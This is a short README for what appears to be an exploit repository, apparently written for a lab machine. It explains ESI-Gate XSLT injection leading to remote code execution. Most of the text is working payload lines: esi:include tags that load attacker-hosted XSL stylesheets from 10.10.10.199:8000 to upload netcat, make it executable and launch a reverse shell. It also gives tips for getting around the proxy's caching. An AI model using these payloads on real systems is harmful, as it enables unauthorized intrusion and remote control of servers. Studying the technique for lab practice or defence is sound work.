# EsiInjection

Esi-Gate XSLT injection Remote Code Execution

Based on this blog: https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/

First, host, the files on a local webserver. 

Then inject the code fragment into a page (via web form etc). Point it at a dummy file to include, and specify the xsl file as a template.
<esi:include src="http://10.10.10.199:8000/dummy1" stylesheet="http://10.10.10.199:8000/ncupload.xsl" />

As the Esi proxy seems to cache files, the names of the pages called need to change each time. For multiple attempts, use a different dummy file file e.g. dummy1, dummy2 etc, and append a number to the xsl files. 

Remote Command Execution reverse shell can be achieved in 3 steps:
1. Upload a copy of nc
<esi:include src="http://10.10.10.199:8000/dummy1" stylesheet="http://10.10.10.199:8000/ncupload.xsl" />
2. Change permissions on nc to execute
<esi:include src="http://10.10.10.199:8000/dummy2" stylesheet="http://10.10.10.199:8000/chmod.xsl" />
3. Run a reverse shell
<esi:include src="http://10.10.10.199:8000/dummy3" stylesheet="http://10.10.10.199:8000/ncshell.xsl" />

